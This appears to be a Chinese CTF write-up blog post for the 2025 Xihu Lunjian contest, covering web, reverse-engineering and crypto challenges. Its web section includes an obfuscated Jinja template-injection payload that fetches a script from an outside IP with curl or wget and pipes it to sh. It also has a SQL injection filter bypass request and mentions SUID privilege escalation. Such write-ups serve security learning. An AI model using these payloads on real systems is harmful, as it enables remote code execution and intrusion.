    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Welcome To Luhaozhhhe's Blog!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2025/02/01/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" itemprop="url">2025西湖论剑</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2025-02-01T10:00:10+08:00">
                2025-02-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
                    <span itemprop="name">WriteUp</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="/images/2025西湖论剑/1.PNG"></p>
<h1 id="web">Web</h1>
<h2 id="rank-l">Rank-l</h2>
<p>网上找之前ciscn ccb的poc就能打</p>
<p><img src="/images/2025西湖论剑/2.PNG"></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phone_number={{url({%set glo='_'+'_'+'globals'+'_'+'_'%}{%set bui='_'+'_'+'builtins'+'_'+'_'%}{%set imp='_'+'_'+'imp'+'ort'+'_'+'_'%}{%set zx='o'+'s'%}{{cycler.next[glo][bui][imp](zx)['pop'+'en']('(curl '+cycler.next[glo][bui]['chr'](45)+'fsSL '+cycler.next[glo][bui]['chr'](45)+'m180 http:'+cycler.next[glo][bui]['chr'](47)+''+cycler.next[glo][bui]['chr'](47)+'8.140.232.67:8084'+cycler.next[glo][bui]['chr'](47)+'slt||wget '+cycler.next[glo][bui]['chr'](45)+'T180 '+cycler.next[glo][bui]['chr'](45)+'q http:'+cycler.next[glo][bui]['chr'](47)+''+cycler.next[glo][bui]['chr'](47)+'8.140.232.67:8084'+cycler.next[glo][bui]['chr'](47)+'slt)|sh')['read']()}})}}</span><br></pre></td></tr></table></figure>
<p>记得要把-和/用chr饶过一下</p>
<p>flag root读</p>
<p>查suid</p>
<p><img src="/images/2025西湖论剑/3.PNG"></p>
<p>公网开vshell把shell弹出来</p>
<p>跟这个博客走一遍suid提权，直接读/flagf149</p>
<p>https://mikokuma.github.io/posts/1ca7db7c/index.html</p>
<p><img src="/images/2025西湖论剑/4.png"></p>
<h2 id="sqli-or-not">sqli or not</h2>
<p>url编码可以绕过第一个检测</p>
<p>使用$`当作'打绕过第二个</p>
<p><img src="/images/2025西湖论剑/5.png"></p>
<p>最终payload</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?info={{url({"username":"admin$`</span> or <span class="string">1=1--</span> ","password":"aa$`"})}} <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 139.155.126.78:25369</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>"macOS"</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
<h1 id="reverse">REVERSE</h1>
<h2 id="bitdance">BitDance</h2>
<p>首先输入任意内容，提示长度错误，因此先进行枚举爆破字符串长度，当字符长度为96时得到不同的输出，因此确定flag字符长度为96位。</p>
<p>然后观察程序输出，默认颜色为绿色，第一行有1个字符为蓝色，后续行每行有一个字符为蓝色。继续观察发现标红的位置为每行中唯一可能变化的值。</p>
<p>后续继续试验发现，输入的字符首先会被转换成二进制序列，然后二进制序列每一行可能变化的位置与输入无关，是程序内的固定逻辑。我们称输入为I，原始序列空间为A（I属于A），经过offset映射后的空间为B，映射变化为T，逆变换为S。则有：</p>
<p>O = S(Rotate(T(I), 1))</p>
<p>程序中给出输出反求输入：</p>
<p>I = S(Rotate(T(O), -1))</p>
<p>执行截图：</p>
<p><img src="/images/2025西湖论剑/6.png"></p>
<p><img src="/images/2025西湖论剑/7.png"></p>
<p><img src="/images/2025西湖论剑/8.png"></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">'output.bin'</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'output.bin'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        output = pickle.load(f)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 连接到指定的地址和端口</span></span><br><span class="line">    p = remote(<span class="string">'139.155.126.78'</span>, <span class="number">16699</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收欢迎信息</span></span><br><span class="line">    welcome_msg = p.recvuntil(<span class="string">'Welcome to dance: '</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送 96 个 0xFF</span></span><br><span class="line">    <span class="comment"># p.sendline(b'\xFF' * 95 + b'\xFC')</span></span><br><span class="line">    <span class="comment"># 将10序列转换成bytes</span></span><br><span class="line">    <span class="comment"># b = '000011000110000101001000001110100000000101000100110100101000110111001010000010111011100000000010101100011100010110001000011001000110011101101001001001100110100100010001110001110100011100011111110111001011011100001110000110100101000011000011010101110000110101110101101011110000000101011000000101001010001000001010111111111100100010001100000001011101100101000000111101101010001100010110001000010101101100111101111111110101100111000010111110110101010010000011100000011011010010001110011010100101000000011100000010001010010110111000111001000100110101000001101000110001001000000000111100001100100000001010100101101010101001111001010010001111000101011011001001001101000010011101011101011011011110101000110110101000011001000100001101110000101110110000010001000010010001001100'</span></span><br><span class="line">    b = [<span class="string">'1'</span>] * (<span class="number">96</span> * <span class="number">8</span>)</span><br><span class="line">    b[<span class="number">767</span>] = <span class="string">'0'</span></span><br><span class="line">    b[<span class="number">143</span>] = <span class="string">'0'</span></span><br><span class="line">    b[<span class="number">722</span>] = <span class="string">'0'</span></span><br><span class="line">    b[<span class="number">387</span>] = <span class="string">'0'</span></span><br><span class="line">    b = <span class="string">''</span>.join(b)</span><br><span class="line">    b = [b[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), <span class="number">8</span>)]</span><br><span class="line">    b = [<span class="built_in">int</span>(i, <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> b]</span><br><span class="line">    p.sendline(<span class="built_in">bytes</span>(b))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收 'Start from 0'</span></span><br><span class="line">    start_from_0 = p.recvuntil(<span class="string">'Start from 0\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印所有输出</span></span><br><span class="line">    output = p.recvall()</span><br><span class="line">    output = output.split(<span class="string">b'\n'</span>)</span><br><span class="line">    output, other = output[:<span class="number">769</span>], output[<span class="number">769</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左删除 '\x1b[0;32m', 右删除 '\x1b[0m'</span></span><br><span class="line">    output = [line[<span class="number">7</span>:-<span class="number">4</span>] <span class="keyword">for</span> line <span class="keyword">in</span> output]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(other)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存输出</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'output.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(output, f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># regex 找到 \x1b[0m\x1b[0;34m0\x1b[0m\x1b[0;32m</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">rb'\x1b\[0m\x1b\[0;\d+m([01])\x1b\[0m\x1b\[0;32m'</span>)</span><br><span class="line"></span><br><span class="line">simple_output = []</span><br><span class="line">pos = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> output:</span><br><span class="line">    <span class="comment"># find pattern in line</span></span><br><span class="line">    <span class="keyword">match</span> = pattern.search(line)</span><br><span class="line">    <span class="keyword">assert</span> <span class="keyword">match</span></span><br><span class="line">    pos.append(<span class="keyword">match</span>.start())</span><br><span class="line">    <span class="comment"># get prefix and suffix, then combine them</span></span><br><span class="line">    prefix = line[:<span class="keyword">match</span>.start()]</span><br><span class="line">    suffix = line[<span class="keyword">match</span>.end():]</span><br><span class="line">    simple_output.append(prefix + <span class="keyword">match</span>.group(<span class="number">1</span>) + suffix)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印简化后的输出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(simple_output)):</span><br><span class="line">    curr_pos = pos[i]</span><br><span class="line">    curr_output = simple_output[i]</span><br><span class="line">    curr_output_with_color = output[i].decode()</span><br><span class="line"></span><br><span class="line">    flip = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">        prev_bit = simple_output[i - <span class="number">1</span>][curr_pos]</span><br><span class="line">        curr_bit = simple_output[i][curr_pos]</span><br><span class="line">        <span class="keyword">if</span> curr_bit != prev_bit:</span><br><span class="line">            flip = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    flip_str = <span class="string">'flip'</span> <span class="keyword">if</span> flip <span class="keyword">else</span> <span class="string">'    '</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'<span class="subst">{curr_pos:<span class="number">3</span>}</span>, <span class="subst">{flip_str}</span>: <span class="subst">{curr_output_with_color}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # map b by pos</span></span><br><span class="line"><span class="comment"># b = ['1'] * (96 * 8)</span></span><br><span class="line"><span class="comment"># b[767] = '0'</span></span><br><span class="line"><span class="comment"># b[143] = '0'</span></span><br><span class="line"><span class="comment"># b[722] = '0'</span></span><br><span class="line"><span class="comment"># b[387] = '0'</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># b_after_map = ['_'] * (96 * 8)</span></span><br><span class="line"><span class="comment"># for i in range(96 * 8):</span></span><br><span class="line"><span class="comment">#     b_after_map[i] = b[pos[i+1]]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># b_after_map = ''.join(b_after_map)</span></span><br><span class="line"><span class="comment"># print(b_after_map)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># b_handle = ['_'] * (96 * 8)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># pos_real = pos[1:]</span></span><br><span class="line"><span class="comment"># simple_output_real = simple_output[1:]</span></span><br><span class="line"><span class="comment"># for i in range(len(simple_output_real)):</span></span><br><span class="line"><span class="comment">#     curr_pos = pos_real[i]</span></span><br><span class="line"><span class="comment">#     curr_output = simple_output_real[i].decode()[curr_pos]</span></span><br><span class="line"><span class="comment">#     b_handle[i] = curr_output</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># b_handle = ''.join(b_handle)</span></span><br><span class="line"><span class="comment"># print(b_handle)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">map_b</span>(<span class="params">b</span>):</span><br><span class="line">    b_after_map = [<span class="string">'_'</span>] * (<span class="number">96</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span> * <span class="number">8</span>):</span><br><span class="line">        b_after_map[i] = b[pos[i + <span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">return</span> b_after_map</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unmap_b</span>(<span class="params">b</span>):</span><br><span class="line">    b_after_unmap = [<span class="string">'_'</span>] * (<span class="number">96</span> * <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span> * <span class="number">8</span>):</span><br><span class="line">        b_after_unmap[pos[i + <span class="number">1</span>]] = b[i]</span><br><span class="line">    <span class="keyword">return</span> b_after_unmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_b</span>(<span class="params">b_str</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(b_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge_b</span>(<span class="params">b_list</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(b_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotate_b</span>(<span class="params">b_list, n</span>):</span><br><span class="line">    <span class="comment"># n may &gt; 0 or &lt; 0</span></span><br><span class="line">    b_list_new = b_list[:]</span><br><span class="line">    n = n % <span class="built_in">len</span>(b_list_new)</span><br><span class="line">    <span class="keyword">return</span> b_list_new[n:] + b_list_new[:n]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip_b</span>(<span class="params">b_list</span>):</span><br><span class="line">    b_list_new = b_list[:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b_list) - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> b_list[i] != b_list[i + <span class="number">1</span>]:</span><br><span class="line">            b_list_new[i + <span class="number">1</span>] = <span class="string">'1'</span> <span class="keyword">if</span> b_list[i + <span class="number">1</span>] == <span class="string">'0'</span> <span class="keyword">else</span> <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">return</span> b_list_new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = ['1'] * (96 * 8)</span></span><br><span class="line"><span class="comment"># b[767] = '0'</span></span><br><span class="line"><span class="comment"># b[143] = '0'</span></span><br><span class="line"><span class="comment"># b[722] = '0'</span></span><br><span class="line"><span class="comment"># b[387] = '0'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = list('011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001011000010110000101100001')</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># b_dup = b[:]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># b = split_b(b)</span></span><br><span class="line"><span class="comment"># b = map_b(b)</span></span><br><span class="line"><span class="comment"># b = ['0'] + b</span></span><br><span class="line"><span class="comment"># # print(merge_b(b))</span></span><br><span class="line"><span class="comment"># # b = flip_b(b)</span></span><br><span class="line"><span class="comment"># b = rotate_b(b, -1)</span></span><br><span class="line"><span class="comment"># # print(merge_b(b))</span></span><br><span class="line"><span class="comment"># b = b[1:]</span></span><br><span class="line"><span class="comment"># b = unmap_b(b)</span></span><br><span class="line"><span class="comment"># b = merge_b(b)</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # revert</span></span><br><span class="line"><span class="comment"># b = split_b(b)</span></span><br><span class="line"><span class="comment"># b = map_b(b)</span></span><br><span class="line"><span class="comment"># b = ['0'] + b</span></span><br><span class="line"><span class="comment"># b = rotate_b(b, 1)</span></span><br><span class="line"><span class="comment"># b = b[1:]</span></span><br><span class="line"><span class="comment"># b = unmap_b(b)</span></span><br><span class="line"><span class="comment"># b = merge_b(b)</span></span><br><span class="line"><span class="comment"># print('compare')</span></span><br><span class="line"><span class="comment"># print(merge_b(b_dup))</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">b = <span class="string">'000011000110000101001000001110100000000101000100110100101000110111001010000010111011100000000010101100011100010110001000011001000110011101101001001001100110100100010001110001110100011100011111110111001011011100001110000110100101000011000011010101110000110101110101101011110000000101011000000101001010001000001010111111111100100010001100000001011101100101000000111101101010001100010110001000010101101100111101111111110101100111000010111110110101010010000011100000011011010010001110011010100101000000011100000010001010010110111000111001000100110101000001101000110001001000000000111100001100100000001010100101101010101001111001010010001111000101011011001001001101000010011101011101011011011110101000110110101000011001000100001101110000101110110000010001000010010001001100'</span></span><br><span class="line">b = split_b(b)</span><br><span class="line">b = map_b(b)</span><br><span class="line">b = [<span class="string">'0'</span>] + b</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'temp1:'</span>, merge_b(b))</span><br><span class="line">b = rotate_b(b, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'temp2:'</span>, merge_b(b))</span><br><span class="line">b = b[<span class="number">1</span>:]</span><br><span class="line">b = unmap_b(b)</span><br><span class="line">b = merge_b(b)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># b = '000011000110000101001000001110100000000101000100110100101000110111001010000010111011100000000010101100011100010110001000011001000110011101101001001001100110100100010001110001110100011100011111110111001011011100001110000110100101000011000011010101110000110101110101101011110000000101011000000101001010001000001010111111111100100010001100000001011101100101000000111101101010001100010110001000010101101100111101111111110101100111000010111110110101010010000011100000011011010010001110011010100101000000011100000010001010010110111000111001000100110101000001101000110001001000000000111100001100100000001010100101101010101001111001010010001111000101011011001001001101000010011101011101011011011110101000110110101000011001000100001101110000101110110000010001000010010001001100'</span></span><br><span class="line"></span><br><span class="line">b = [b[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), <span class="number">8</span>)]</span><br><span class="line">b = [<span class="built_in">int</span>(i, <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> b]</span><br><span class="line">b = <span class="built_in">bytes</span>(b)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
<h1 id="crypto">Crypto</h1>
<h2 id="martixrsa">MartixRSA</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">ext_len = <span class="number">9</span>*<span class="number">23</span> - <span class="built_in">len</span>(flag)</span><br><span class="line">flag += <span class="string">''</span>.join(random.choice(string.printable) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ext_len))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_rsa_encrypt</span>():</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        data.append(bytes_to_long(flag[<span class="number">23</span>*i:<span class="number">23</span>*(i+<span class="number">1</span>)].encode()))</span><br><span class="line">    M = Matrix(Zmod(n), [data[i:i+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">3</span>)])</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    C = M**e</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"p ="</span>, p &gt;&gt; <span class="number">100</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"n ="</span>, n)</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line">C = my_rsa_encrypt()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"C ="</span>, C)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p = 9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275</span></span><br><span class="line"><span class="string">n = 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009</span></span><br><span class="line"><span class="string">C = [130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941  71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757  67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615]</span></span><br><span class="line"><span class="string">[ 23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993   9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601  44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401]</span></span><br><span class="line"><span class="string">[ 67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572  13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727  95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
